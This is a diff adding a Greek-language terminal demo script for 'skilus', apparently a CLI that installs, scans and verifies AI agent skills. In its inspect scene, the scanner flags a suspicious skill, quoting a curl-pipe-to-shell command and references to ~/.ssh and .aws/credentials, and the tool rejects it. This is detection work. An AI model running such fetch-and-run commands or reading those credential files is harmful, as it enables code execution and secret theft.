@@ -1,0 +1,360 @@
+{
+ "lang": "el",
+ "cols": 76,
+ "scenes": [
+  {
+   "name": "add",
+   "steps": [
+    [
+     "cmd",
+     "skilus add anthropics/skills"
+    ],
+    [
+     "frame",
+     [
+      "<span class=\"b\">github.com/anthropics/skills</span> · commit dbd4588f9e10 · 19 skills",
+      "",
+      "<span class=\"b\">Ποιες skills να εγκαταστήσω;</span>",
+      "↑↓ μετακίνηση · διάστημα επιλογή · → όλες · ← καμία · πληκτρολόγησε για φί…",
+      "<span class=\"c\">›</span> <span class=\"g\">[x]</span> <span class=\"b\">academy-guide        </span>  <span class=\"d\">Stop and check this skill before finishing an…</span>",
+      "  <span class=\"g\">[x]</span> <span class=\"b\">algorithmic-art      </span>  <span class=\"d\">Creating algorithmic art using p5.js with see…</span>",
+      "  <span class=\"g\">[x]</span> <span class=\"b\">brand-guidelines     </span>  <span class=\"d\">Applies Anthropic&#x27;s official brand colors and…</span>",
+      "  <span class=\"g\">[x]</span> <span class=\"b\">canvas-design        </span>  <span class=\"d\">Create beautiful visual art in .png and .pdf …</span>",
+      "  <span class=\"g\">[x]</span> <span class=\"b\">claude-api           </span>  <span class=\"d\">Reference for the Claude API / Anthropic SDK …</span>",
+      "  <span class=\"g\">[x]</span> <span class=\"b\">discernment-nudge    </span>  <span class=\"d\">After you give a substantive answer or draft …</span>",
+      "  <span class=\"g\">[x]</span> <span class=\"b\">doc-coauthoring      </span>  <span class=\"d\">Guide users through a structured workflow for…</span>",
+      "  <span class=\"g\">[x]</span> <span class=\"b\">docx                 </span>  <span class=\"d\">Use this skill whenever the user wants to cre…</span>",
+      "  <span class=\"g\">[x]</span> <span class=\"b\">frontend-design      </span>  <span class=\"d\">Guidance for distinctive, intentional visual …</span>",
+      "  <span class=\"g\">[x]</span> <span class=\"b\">internal-comms       </span>  <span class=\"d\">A set of resources to help me write all kinds…</span>",
+      "  <span class=\"g\">[x]</span> <span class=\"b\">mcp-builder          </span>  <span class=\"d\">Guide for creating high-quality MCP (Model Co…</span>",
+      "  <span class=\"g\">[x]</span> <span class=\"b\">pdf                  </span>  <span class=\"d\">Use this skill whenever the user wants to do …</span>",
+      "<span class=\"d\">  ↓ 7 ακόμη</span>",
+      "<span class=\"d\">  19 από 19 επιλεγμένα</span>"
+     ],
+     1800
+    ],
+    [
+     "frame",
+     [
+      "<span class=\"b\">github.com/anthropics/skills</span> · commit dbd4588f9e10 · 19 skills",
+      "",
+      "<span class=\"b\">Ποιες skills να εγκαταστήσω;</span>",
+      "↑↓ μετακίνηση · διάστημα επιλογή · → όλες · ← καμία · πληκτρολόγησε για φί…",
+      "<span class=\"c\">›</span> [ ] <span class=\"b\">academy-guide        </span>  <span class=\"d\">Stop and check this skill before finishing an…</span>",
+      "  [ ] <span class=\"b\">algorithmic-art      </span>  <span class=\"d\">Creating algorithmic art using p5.js with see…</span>",
+      "  [ ] <span class=\"b\">brand-guidelines     </span>  <span class=\"d\">Applies Anthropic&#x27;s official brand colors and…</span>",
+      "  [ ] <span class=\"b\">canvas-design        </span>  <span class=\"d\">Create beautiful visual art in .png and .pdf …</span>",
+      "  [ ] <span class=\"b\">claude-api           </span>  <span class=\"d\">Reference for the Claude API / Anthropic SDK …</span>",
+      "  [ ] <span class=\"b\">discernment-nudge    </span>  <span class=\"d\">After you give a substantive answer or draft …</span>",
+      "  [ ] <span class=\"b\">doc-coauthoring      </span>  <span class=\"d\">Guide users through a structured workflow for…</span>",
+      "  [ ] <span class=\"b\">docx                 </span>  <span class=\"d\">Use this skill whenever the user wants to cre…</span>",
+      "  [ ] <span class=\"b\">frontend-design      </span>  <span class=\"d\">Guidance for distinctive, intentional visual …</span>",
+      "  [ ] <span class=\"b\">internal-comms       </span>  <span class=\"d\">A set of resources to help me write all kinds…</span>",
+      "  [ ] <span class=\"b\">mcp-builder          </span>  <span class=\"d\">Guide for creating high-quality MCP (Model Co…</span>",
+      "  [ ] <span class=\"b\">pdf                  </span>  <span class=\"d\">Use this skill whenever the user wants to do …</span>",
+      "<span class=\"d\">  ↓ 7 ακόμη</span>",
+      "<span class=\"d\">  0 από 19 επιλεγμένα</span>"
+     ],
+     900
+    ],
+    [
+     "frame",
+     [
+      "<span class=\"b\">github.com/anthropics/skills</span> · commit dbd4588f9e10 · 19 skills",
+      "",
+      "<span class=\"b\">Ποιες skills να εγκαταστήσω;</span>",
+      "↑↓ μετακίνηση · διάστημα επιλογή · → όλες · ← καμία · πληκτρολόγησε για φί…",
+      "<span class=\"d\">Φίλτρο:</span> <span class=\"b\">p</span>",
+      "<span class=\"c\">›</span> [ ] <span class=\"b\">claude-api    </span>  <span class=\"d\">Reference for the Claude API / Anthropic SDK — model…</span>",
+      "  [ ] <span class=\"b\">mcp-builder   </span>  <span class=\"d\">Guide for creating high-quality MCP (Model Context P…</span>",
+      "  [ ] <span class=\"b\">pdf           </span>  <span class=\"d\">Use this skill whenever the user wants to do anythin…</span>",
+      "  [ ] <span class=\"b\">pptx          </span>  <span class=\"d\">Use this skill any time a .pptx or .potx file is inv…</span>",
+      "  [ ] <span class=\"b\">webapp-testing</span>  <span class=\"d\">Toolkit for interacting with and testing local web a…</span>",
+      "<span class=\"d\">  5 από 19 ταιριάζουν · 0 επιλεγμένα</span>"
+     ],
+     450
+    ],
+    [
+     "frame",
+     [
+      "<span class=\"b\">github.com/anthropics/skills</span> · commit dbd4588f9e10 · 19 skills",
+      "",
+      "<span class=\"b\">Ποιες skills να εγκαταστήσω;</span>",
+      "↑↓ μετακίνηση · διάστημα επιλογή · → όλες · ← καμία · πληκτρολόγησε για φί…",
+      "<span class=\"d\">Φίλτρο:</span> <span class=\"b\">pd</span>",
+      "<span class=\"c\">›</span> [ ] <span class=\"b\">pdf</span>  <span class=\"d\">Use this skill whenever the user wants to do anything with PDF …</span>",
+      "<span class=\"d\">  1 από 19 ταιριάζουν · 0 επιλεγμένα</span>"
+     ],
+     450
+    ],
+    [
+     "frame",
+     [
+      "<span class=\"b\">github.com/anthropics/skills</span> · commit dbd4588f9e10 · 19 skills",
+      "",
+      "<span class=\"b\">Ποιες skills να εγκαταστήσω;</span>",
+      "↑↓ μετακίνηση · διάστημα επιλογή · → όλες · ← καμία · πληκτρολόγησε για φί…",
+      "<span class=\"d\">Φίλτρο:</span> <span class=\"b\">pdf</span>",
+      "<span class=\"c\">›</span> [ ] <span class=\"b\">pdf</span>  <span class=\"d\">Use this skill whenever the user wants to do anything with PDF …</span>",
+      "<span class=\"d\">  1 από 19 ταιριάζουν · 0 επιλεγμένα</span>"
+     ],
+     700
+    ],
+    [
+     "frame",
+     [
+      "<span class=\"b\">github.com/anthropics/skills</span> · commit dbd4588f9e10 · 19 skills",
+      "",
+      "<span class=\"b\">Ποιες skills να εγκαταστήσω;</span>",
+      "↑↓ μετακίνηση · διάστημα επιλογή · → όλες · ← καμία · πληκτρολόγησε για φί…",
+      "<span class=\"d\">Φίλτρο:</span> <span class=\"b\">pdf</span>",
+      "<span class=\"c\">›</span> <span class=\"g\">[x]</span> <span class=\"b\">pdf</span>  <span class=\"d\">Use this skill whenever the user wants to do anything with PDF …</span>",
+      "<span class=\"d\">  1 από 19 ταιριάζουν · 1 επιλεγμένα</span>"
+     ],
+     900
+    ],
+    [
+     "frame",
+     [
+      "<span class=\"b\">github.com/anthropics/skills</span> · commit dbd4588f9e10 · 19 skills",
+      "",
+      "<span class=\"b\">Ποιες skills να εγκαταστήσω;</span> pdf",
+      "<span class=\"b\">Σε ποιους πράκτορες;</span>",
+      "↑↓ μετακίνηση · διάστημα επιλογή · → όλους · ← κανέναν · πληκτρολόγησε για…",
+      "<span class=\"c\">›</span> <span class=\"g\">[x]</span> <span class=\"b\">Claude Code</span>  <span class=\"d\">.claude/skills</span>",
+      "  <span class=\"g\">[x]</span> <span class=\"b\">Codex      </span>  <span class=\"d\">.agents/skills</span>",
+      "  2 από 74 πράκτορες εγκατεστημένοι · για τους υπόλοιπους, --agent &lt;id&gt; (λ…"
+     ],
+     1600
+    ],
+    [
+     "frame",
+     [
+      "<span class=\"b\">github.com/anthropics/skills</span> · commit dbd4588f9e10 · 19 skills",
+      "",
+      "<span class=\"b\">Ποιες skills να εγκαταστήσω;</span> pdf",
+      "<span class=\"b\">Σε ποιους πράκτορες;</span> Claude Code, Codex",
+      "<span class=\"b\">github.com/anthropics/skills</span> · commit dbd4588f9e10 · 1 skill",
+      "",
+      "● <span class=\"b\">pdf</span>   <span class=\"d\">12 αρχεία · 57 KiB · sha256 32cdced3a21a</span>",
+      "  Use this skill whenever the user wants to do anything with PDF files. This",
+      "  includes reading or extracting text/tables from PDFs, combining or mergin…",
+      "  <span class=\"y\">!</span> scripts/extract_form_structure.py: εκτελέσιμο αρχείο· αποδέξου το με",
+      "    allow: [scripts] <span class=\"d\">[executable]</span>",
+      "",
+      "Προορισμοί:",
+      "  .claude/skills (claude-code, copy)",
+      "  .agents/skills (codex, copy)",
+      "1 skill · 0 μπλοκαρίσματα · <span class=\"y\">1 προειδοποίηση</span>",
+      "Εγκατάσταση; [ν/N]"
+     ],
+     1800
+    ],
+    [
+     "frame",
+     [
+      "<span class=\"b\">github.com/anthropics/skills</span> · commit dbd4588f9e10 · 19 skills",
+      "",
+      "<span class=\"b\">Ποιες skills να εγκαταστήσω;</span> pdf",
+      "<span class=\"b\">Σε ποιους πράκτορες;</span> Claude Code, Codex",
+      "<span class=\"b\">github.com/anthropics/skills</span> · commit dbd4588f9e10 · 1 skill",
+      "",
+      "● <span class=\"b\">pdf</span>   <span class=\"d\">12 αρχεία · 57 KiB · sha256 32cdced3a21a</span>",
+      "  Use this skill whenever the user wants to do anything with PDF files. This",
+      "  includes reading or extracting text/tables from PDFs, combining or mergin…",
+      "  <span class=\"y\">!</span> scripts/extract_form_structure.py: εκτελέσιμο αρχείο· αποδέξου το με",
+      "    allow: [scripts] <span class=\"d\">[executable]</span>",
+      "",
+      "Προορισμοί:",
+      "  .claude/skills (claude-code, copy)",
+      "  .agents/skills (codex, copy)",
+      "1 skill · 0 μπλοκαρίσματα · <span class=\"y\">1 προειδοποίηση</span>",
+      "Εγκατάσταση; [ν/N] ν",
+      "",
+      "Εγκαταστάθηκε η pdf (32cdced3a21a) σε 2 προορισμούς."
+     ],
+     2600
+    ]
+   ]
+  },
+  {
+   "name": "inspect",
+   "steps": [
+    [
+     "cmd",
+     "skilus inspect ./downloads/quick-cleanup"
+    ],
+    [
+     "frame",
+     [
+      "<span class=\"b\">downloads/quick-cleanup</span> · 1 skill",
+      "",
+      "● <span class=\"b\">quick-cleanup</span>   <span class=\"d\">2 αρχεία · 298 B · sha256 27a5b9bedd30</span>",
+      "  Clears build caches and temporary files in the current project.",
+      "  <span class=\"y\">!</span> SKILL.md: αναφέρει διαπιστευτήρια: ~/.ssh <span class=\"d\">[credential-access]</span>",
+      "  <span class=\"y\">!</span> scripts/setup.sh: εκτελέσιμο αρχείο· αποδέξου το με allow: [scripts]",
+      "    <span class=\"d\">[executable]</span>",
+      "  <span class=\"y\">!</span> scripts/setup.sh: κατεβάζει και εκτελεί κώδικα: curl -fsSL",
+      "    https://get.example.dev/setup.sh | sh <span class=\"d\">[pipe-to-shell]</span>",
+      "  <span class=\"y\">!</span> scripts/setup.sh: αναφέρει διαπιστευτήρια: .aws/credentials",
+      "    <span class=\"d\">[credential-access]</span>",
+      "",
+      "1 skill · 0 μπλοκαρίσματα · <span class=\"y\">4 προειδοποιήσεις</span>"
+     ],
+     2600
+    ],
+    [
+     "clear"
+    ],
+    [
+     "cmd",
+     "skilus add ./downloads/quick-cleanup --strict -y"
+    ],
+    [
+     "frame",
+     [
+      "<span class=\"b\">./downloads/quick-cleanup</span> · 1 skill",
+      "",
+      "● <span class=\"b\">quick-cleanup</span>   <span class=\"d\">2 αρχεία · 298 B · sha256 27a5b9bedd30</span>",
+      "  Clears build caches and temporary files in the current project.",
+      "  <span class=\"y\">!</span> SKILL.md: αναφέρει διαπιστευτήρια: ~/.ssh <span class=\"d\">[credential-access]</span>",
+      "  <span class=\"y\">!</span> scripts/setup.sh: εκτελέσιμο αρχείο· αποδέξου το με allow: [scripts]",
+      "    <span class=\"d\">[executable]</span>",
+      "  <span class=\"y\">!</span> scripts/setup.sh: κατεβάζει και εκτελεί κώδικα: curl -fsSL",
+      "    https://get.example.dev/setup.sh | sh <span class=\"d\">[pipe-to-shell]</span>",
+      "  <span class=\"y\">!</span> scripts/setup.sh: αναφέρει διαπιστευτήρια: .aws/credentials",
+      "    <span class=\"d\">[credential-access]</span>",
+      "",
+      "Προορισμοί:",
+      "  .claude/skills (claude-code, copy)",
+      "  .agents/skills (codex, copy)",
+      "1 skill · 0 μπλοκαρίσματα · <span class=\"y\">4 προειδοποιήσεις</span>",
+      "skilus: quick-cleanup: 4 προειδοποιήσεις με --strict: απορρίφθηκε από τον έλεγχο"
+     ],
+     600
+    ],
+    [
+     "cmd",
+     "echo $?"
+    ],
+    [
+     "frame",
+     [
+      "5"
+     ],
+     3000
+    ]
+   ]
+  },
+  {
+   "name": "verify",
+   "steps": [
+    [
+     "cmd",
+     "echo \"# tweak\" >> .claude/skills/pdf/SKILL.md"
+    ],
+    [
+     "frame",
+     [],
+     600
+    ],
+    [
+     "cmd",
+     "skilus verify"
+    ],
+    [
+     "frame",
+     [
+      "ΑΛΛΑΓΜΕΝΗ pdf (project, claude-code) στο ~/acme-app/.claude/skills/pdf",
+      "  τροποποιημένο: SKILL.md",
+      "Τρέξε skilus sync για να τις επαναφέρεις (με --force αν τις άλλαξες με το χέρι)."
+     ],
+     600
+    ],
+    [
+     "cmd",
+     "echo $?"
+    ],
+    [
+     "frame",
+     [
+      "6"
+     ],
+     1200
+    ],
+    [
+     "cmd",
+     "skilus sync --force"
+    ],
+    [
+     "frame",
+     [
+      "Αντικαταστάθηκε η pdf στο ~/acme-app/.claude/skills/pdf",
+      "Συγχρονίστηκαν: 0 εγκαταστάσεις, 1 αντικαταστάσεις, 5 χωρίς αλλαγές."
+     ],
+     900
+    ],
+    [
+     "cmd",
+     "skilus verify"
+    ],
+    [
+     "frame",
+     [
+      "Όλα εντάξει: 3 skill(s) σε 6 προορισμό(ούς) ταιριάζουν με το lock."
+     ],
+     3000
+    ]
+   ]
+  },
+  {
+   "name": "update",
+   "steps": [
+    [
+     "cmd",
+     "skilus update --check"
+    ],
+    [
+     "frame",
+     [
+      "SKILL      ΕΥΡΟΣ    REF                      ΕΓΚΑΤΕΣΤΗΜΕΝΟ  ΤΕΛΕΥΤΑΙΟ     ΚΑΤΑΣΤΑΣΗ",
+      "changelog  project  (προεπιλεγμένος κλάδος)  9563a12b25b5   1b288cd0c1c1  υπάρχει νέα έκδοση",
+      "pdf        project  (προεπιλεγμένος κλάδος)  dbd4588f9e10   dbd4588f9e10  ενημερωμένη",
+      "review     project  (προεπιλεγμένος κλάδος)  9563a12b25b5   1b288cd0c1c1  υπάρχει νέα έκδοση"
+     ],
+     1800
+    ],
+    [
+     "cmd",
+     "skilus update review"
+    ],
+    [
+     "frame",
+     [
+      "● <span class=\"b\">review</span>   <span class=\"d\">9563a12b25b5 → 1b288cd0c1c1 · sha256 3a46a113926d → 1c92660a3b6f</span>",
+      "  <span class=\"y\">~</span> SKILL.md",
+      "  <span class=\"g\">✓</span> κανένα εύρημα",
+      "",
+      "1 skill · 0 μπλοκαρίσματα · 0 προειδοποιήσεις",
+      "Ενημέρωση; [ν/N]"
+     ],
+     1800
+    ],
+    [
+     "frame",
+     [
+      "● <span class=\"b\">review</span>   <span class=\"d\">9563a12b25b5 → 1b288cd0c1c1 · sha256 3a46a113926d → 1c92660a3b6f</span>",
+      "  <span class=\"y\">~</span> SKILL.md",
+      "  <span class=\"g\">✓</span> κανένα εύρημα",
+      "",
+      "1 skill · 0 μπλοκαρίσματα · 0 προειδοποιήσεις",
+      "Ενημέρωση; [ν/N] ν",
+      "",
+      "Η review ενημερώθηκε σε 1b288cd0c1c1 (1c92660a3b6f)."
+     ],
+     3200
+    ]
+   ]
+  }
+ ]
+}
